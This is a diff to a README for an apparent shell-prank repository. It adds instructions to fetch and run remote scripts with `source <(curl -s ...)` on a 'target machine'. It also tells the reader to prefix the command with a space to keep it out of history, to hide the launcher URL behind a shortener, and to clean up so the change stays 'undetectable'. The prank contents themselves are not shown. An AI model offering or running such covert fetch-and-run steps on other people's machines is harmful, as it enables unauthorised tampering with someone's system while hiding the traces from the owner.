@@ -14,9 +14,19 @@ sh update.sh
 ## Remote usage (no clone left behind)
 Apply a prank to a target machine without cloning the repo there.
 Run it with `source` so it affects the current shell, and **prefix with a space**
-so the command itself is not saved to history:
+so the command itself is not saved to history. The launcher is the 1-char file
+`x`; with no argument it applies the default prank (`virus.sed`):
 ```
- source <(curl -fsSL https://raw.githubusercontent.com/Motifman/prank-zshrc-zoo/main/train_remote.sh) virus.sed
+ source <(curl -s https://raw.githubusercontent.com/Motifman/prank-zshrc-zoo/main/x)
+```
+Specify a different prank as an argument:
+```
+ source <(curl -s https://raw.githubusercontent.com/Motifman/prank-zshrc-zoo/main/x) virus_sl.sed
+```
+Shortest form (fastest to type) — point your own short URL at the `x` raw URL
+above using any shortener you like, then:
+```
+ source <(curl -s SHORT_URL_HERE)
 ```
 What it cleans up to stay undetectable:
 - No `prank-zshrc-zoo` directory is left on the target machine.
@@ -30,7 +40,7 @@ What it cleans up to stay undetectable:
 
 Remote reset (also no clone needed):
 ```
- source <(curl -fsSL https://raw.githubusercontent.com/Motifman/prank-zshrc-zoo/main/reset_all.sh)
+ source <(curl -s https://raw.githubusercontent.com/Motifman/prank-zshrc-zoo/main/reset_all.sh)
 ```
 
 Stealth tips:
